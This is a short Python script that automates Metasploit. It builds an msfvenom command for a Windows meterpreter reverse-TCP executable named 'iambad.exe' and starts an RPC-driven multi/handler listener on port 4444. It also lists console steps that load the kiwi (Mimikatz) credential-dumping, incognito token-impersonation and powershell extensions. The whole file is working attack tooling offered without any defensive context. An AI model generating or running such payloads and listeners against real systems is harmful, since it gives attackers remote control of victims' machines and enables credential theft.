import os
import socket
from pymetasploit3.msfrpc import MsfRpcClient, MsfConsole
from time import sleep


def get_ip() -> str:
    """this function returns the ip address of the machine
    :return: the ip address of the machine"""
    tmp_server = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    tmp_server.connect(('8.8.8.8', 1))
    the_ip = tmp_server.getsockname()[0]
    tmp_server.close()
    return the_ip


ip = get_ip()
commend = f"/opt/metasploit-framework/bin/msfvenom -p windows/meterpreter/reverse_tcp lhost={ip} lport=4444 -f " \
          f"exe -o /Users/matanmishali/Downloads/iambad.exe "
# os.system(commend)
os.system("/opt/metasploit-framework/bin/msfrpcd -P 1313 -n -f -a 127.0.0.1")
sleep(5)
client = MsfRpcClient("1313")
exploit = client.modules.use("exploit", "multi/handler")
exploit["PAYLOAD"] = "windows/meterpreter/reverse_tcp"
exploit["LPORT"] = "4444"
exploit["LHOST"] = ip
exploit.execute()



x = ["/opt/metasploit-framework/bin/msfconsole",
     "use exploit/multi/handler",
     "set PAYLOAD windows/meterpreter/reverse_tcp",
     "set lport 4444",
     f"set lhost {ip}",
     "exploit",
     "use powershell",
     "use kiwi",
     "use incognito",
     "powershell_shell"]
